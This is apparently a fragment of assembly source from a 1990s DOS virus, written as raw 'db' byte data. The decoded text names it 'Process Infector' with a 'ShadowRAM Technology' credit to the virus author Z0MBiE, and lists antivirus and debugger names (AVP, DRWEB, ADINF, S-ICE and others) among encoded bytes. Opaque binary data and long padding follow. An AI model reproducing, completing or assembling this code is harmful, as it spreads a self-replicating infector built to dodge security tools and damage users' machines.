db 050h,072h,06fh,063h,065h,073h,073h,020h,049h,06eh,066h,065h,063h,074h,06fh
db 072h,00dh,00ah,053h,068h,061h,064h,06fh,077h,052h,041h,04dh,020h,054h,065h
db 063h,068h,06eh,06fh,06ch,06fh,067h,079h,020h,028h,063h,029h,020h,031h,039h
db 039h,036h,02ch,039h,037h,020h,05ah,030h,04dh,042h,069h,045h,00dh,00ah,041h
db 044h,049h,04eh,046h,0f9h,0a3h,0a0h,0a2h,0adh,0aeh,041h,049h,044h,053h,0f9h
db 0afh,0aeh,0a3h,0a0h,0adh,0ech,041h,056h,050h,0f9h,0f9h,0e1h,0a0h,0aah,0e1h
db 0f9h,0f9h,057h,045h,042h,0f9h,0f9h,0e3h,0a9h,0aeh,0a1h,0aeh,0aah,044h,052h
db 057h,045h,042h,0f9h,0e2h,0aeh,0a6h,0a5h,0f9h,0f9h,0e5h,0e3h,0a9h,0adh,0efh
db 0f9h,0f9h,0b0h,0b0h,0b0h,0f9h,0a4h,0a5h,0e0h,0ech,0ach,0aeh,0f9h,043h,050h
db 050h,0adh,0a5h,0adh,0a0h,0a2h,0a8h,0a6h,0e3h,043h,020h,020h,053h,02dh,049h
db 043h,045h,0f9h,0e0h,0e3h,0abh,0a5h,0a7h,054h,044h,0f9h,0ach,0a0h,0e1h,0e2h
db 0f9h,0a4h,0a0h,0a9h,044h,045h,042h,055h,047h,0f9h,0f9h,0a3h,0e3h,0a4h,0f9h
db 057h,045h,042h,037h,030h,038h,030h,031h,0edh,0e2h,0aeh,043h,041h,0f9h,0ach
db 0aeh,0f1h,0f9h,0f9h,041h,056h,0f9h,015h,000h,01eh,051h,000h,0f1h,060h,01eh
db 009h,0bdh,000h,0a3h,0f7h,000h,0fah,005h,074h,00bh,006h,000h,0b4h,022h,000h
db 01eh,0f7h,0ebh,0f1h,0b3h,000h,080h,0dfh,000h,024h,016h,002h,03dh,032h,000h
db 01eh,05eh,000h,095h,025h,0b8h,001h,0c5h,000h,033h,0e1h,000h,0e9h,0c9h,004h
db 0b1h,03eh,000h,0fah,05ah,000h,00bh,04ch,013h,08bh,0cdh,000h,080h,0f9h,000h
db 07fh,0dfh,0e0h,059h,009h,000h,02eh,025h,000h,025h,0e5h,009h,0e8h,037h,000h
db 0e8h,063h,000h,0a4h,0f8h,002h,04bh,009h,000h,050h,025h,000h,025h,052h,084h
db 000h,043h,000h,080h,06fh,000h,04eh,09ah,044h,003h,01ah,000h,050h,046h,000h
db 0adh,0cbh,033h,0c0h,085h,000h,0a1h,0a1h,000h,01bh,0fdh,006h,0a3h,036h,000h
db 0b8h,052h,000h,05bh,0c6h,0e0h,050h,0b2h,000h,09ch,0deh,000h,04eh,0e3h,0c9h
db 08eh,007h,000h,08eh,023h,000h,083h,008h,0a2h,002h,0b3h,000h,091h,0dfh,000h
db 059h,0feh,015h,003h,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh,03fh
db 03fh,03fh,03fh





